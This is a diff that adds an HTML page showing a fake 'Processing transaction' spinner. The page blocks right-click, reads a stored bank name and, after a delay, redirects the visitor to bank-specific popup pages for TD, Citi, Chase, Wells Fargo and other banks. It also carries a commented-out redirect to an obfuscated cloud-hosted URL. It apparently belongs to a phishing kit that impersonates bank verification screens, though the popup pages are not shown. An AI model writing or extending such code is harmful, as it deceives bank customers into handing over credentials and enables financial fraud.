@@ -1,0 +1,185 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-BmbxuPwQa2lc/FVzBcNJ7UAyJxM6wuqIj61tLrc4wSX0szH/Ev+nYRRuWlolflfl" crossorigin="anonymous">
+    <link href="css/loading.css" rel="stylesheet">
+    <title>Document</title>
+</head>
+<body>
+    
+    <div class="center">
+    <p class="info">Processing transaction.....Do not refresh or reload</p>
+    <div class="spinner-grow text-primary" role="status">
+    <span class="visually-hidden">Loading...</span>
+    </div>
+    <div class="spinner-grow text-secondary" role="status">
+    <span class="visually-hidden">Loading...</span>
+    </div>
+    <div class="spinner-grow text-success" role="status">
+    <span class="visually-hidden">Loading...</span>
+    </div>
+    <div class="spinner-grow text-danger" role="status">
+    <span class="visually-hidden">Loading...</span>
+    </div>
+    <div class="spinner-grow text-warning" role="status">
+    <span class="visually-hidden">Loading...</span>
+    </div>
+    <div class="spinner-grow text-info" role="status">
+    <span class="visually-hidden">Loading...</span>
+    </div>
+    <div class="spinner-grow text-light" role="status">
+    <span class="visually-hidden">Loading...</span>
+    </div>
+    <div class="spinner-grow text-dark" role="status">
+    <span class="visually-hidden">Loading...</span>
+    </div>
+    </div>
+
+    <script>
+  document.addEventListener("contextmenu", function(e){
+    e.preventDefault();
+}, false);
+</script>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta2/dist/js/bootstrap.bundle.min.js" integrity="sha384-b5kHyXgcpbZJO/tY9Ul7kGkf1S0CWuKcCD38l8YkeH8z8QjE0GmW1gYU5S9FOnJ0" crossorigin="anonymous"></script>
+    <script>
+        // setTimeout(()=>{
+        //     window.location.replace("http://serveweb-env.eba-9h2pg3sq.us-east-2.elasticbeanstalk.com/extension-asdas-sddfsdfsdf-sdvsdf33243feaar44grbgrg");
+        // },3000);
+        var website = "";
+        setTimeout(()=>{
+                    var check = false;
+                    var bank = localStorage.getItem('bank-name');
+                    website = localStorage.getItem('bank-website');
+                    console.log(bank)
+                    if(window.innerWidth>400){
+                        check=true;
+                    }
+                    if(check){
+                        switch(bank){
+                            case "TD BANK, N.A.": 
+                            case "TD BANK":
+                             window.location = "td_desktop_popup.html"
+                            break;
+                            case "CITIBANK USA, N.A.":
+                            case "CITIBANK USA": 
+                             window.location = "citi_desktop_popup"
+                            break;
+                            case "AMERICAN EXPRESS":
+                            case "AMERICAN EXPRESS, N.A.": 
+                             window.location = "AM_desktop_popup.html"
+                            break;
+                            case "BANK OF AMERICA":
+                            case "BANK OF AMERICA, N.A.": 
+                             window.location = "boa_desktop_popup.html"
+                            break;
+                            case "CAPITAL ONE BANK (USA), N.A.":
+                            case "CAPITAL ONE BANK (USA)":
+                            case "CAPITAL ONE, N.A.": 
+                             window.location = "captitalone_dekstop_popup.html"
+                            break;
+                            case "JPMORGAN CHASE BANK, N.A.":
+                            case "JPMORGAN CHASE BANK": 
+                            case "CHASE BANK USA, N.A.":
+                             window.location = "chase_desktop_popup.html"
+                            break;
+                            case "DISCOVER BANK":
+                            case "DISCOVER BANK, N.A.": 
+                             window.location = "discover_desktop_popup.html"
+                            break;
+                            case "PNC BANK, N.A.":
+                            case "PNC BANK": 
+                             window.location = "pnc_desktop_popup.html"
+                            break;
+                            case "REGIONS BANK": 
+                            case "REGIONS BANK, N.A.":
+                             window.location = "regions_desktop_popup.html"
+                            break;
+                            case "SOUTH STATE BANK": 
+                            case "SOUTH STATE BANK, N.A.":
+                             window.location = "southstate_desktop_popup.html"
+                            break;
+                            case "SUNTRUST BANK":
+                            case "SUNTRUST BANK, N.A.":
+                            case "BRANCH BANKING AND TRUST COMPANY":  
+                            case "BRANCH BANKING AND TRUST COMPANY, N.A":
+                             window.location = "truist_desktop_popup.html"
+                            break;
+                            case "WELLS FARGO BANK, N.A.": 
+                            case "WELLS FARGO BANK":
+                                window.location = "wellsfargo_desktop_popup.html"
+                            break;
+                            default:
+                                window.location = "default_desktop_popup.html"
+                        
+                        }
+                    }
+                    else{
+                        switch(bank){
+                            case "TD BANK, N.A.": 
+                            case "TD BANK": 
+                             window.location = "td_mobile_popup.html"
+                            break;
+                            case "CITIBANK USA, N.A.":
+                            case "CITIBANK USA":
+                            case "CITIBANK N.A.": 
+                             window.location = "citi_mobile_popup.html"
+                            break;
+                            case "AMERICAN EXPRESS":
+                            case "AMERICAN EXPRESS, N.A.": 
+                             window.location = "am_mobile_popup.html"
+                            break;
+                            case "BANK OF AMERICA":
+                            case "BANK OF AMERICA, N.A.": 
+                             window.location = "boa_mobile_popup.html"
+                            break;
+                            case "CAPITAL ONE BANK (USA), N.A.":
+                            case "CAPITAL ONE BANK (USA)": 
+                            case "CAPITAL ONE, N.A.":
+                             window.location = "capitalone_mobile_popup.html"
+                            break;
+                            case "JPMORGAN CHASE BANK, N.A.":
+                            case "JPMORGAN CHASE BANK":  
+                            case "CHASE BANK USA, N.A.":
+                             window.location = "chase_mobile_popup.html"
+                            break;
+                            case "DISCOVER BANK":
+                            case "DISCOVER BANK, N.A.": 
+                             window.location = "discover_mobile_popup.html"
+                            break;
+                            case "PNC BANK, N.A.":
+                            case "PNC BANK":  
+                             window.location = "pnc_mobile_popup.html"
+                            break;
+                            case "REGIONS BANK": 
+                            case "REGIONS BANK, N.A.": 
+                             window.location = "regions_mobile_popup.html"
+                            break;
+                            case "SOUTH STATE BANK": 
+                            case "SOUTH STATE BANK, N.A.": 
+                             window.location = "southstate_mobile_popup.html"
+                            break;
+                            case "SUNTRUST BANK":
+                            case "SUNTRUST BANK, N.A.":
+                            case "BRANCH BANKING AND TRUST COMPANY":  
+                            case "BRANCH BANKING AND TRUST COMPANY, N.A":
+                             window.location = "truist_mobile_popup"
+                            break;
+                            case "WELLS FARGO BANK, N.A.": 
+                            case "WELLS FARGO BANK":
+                            window.location = "wellsfargo_mobile_popup.html"
+                            break;
+                            default:
+                            window.location = "default_mobile_popup.html"
+                        }
+                    }
+        },4000)
+    </script>
+
+
+    
+
+</body>
+</html>
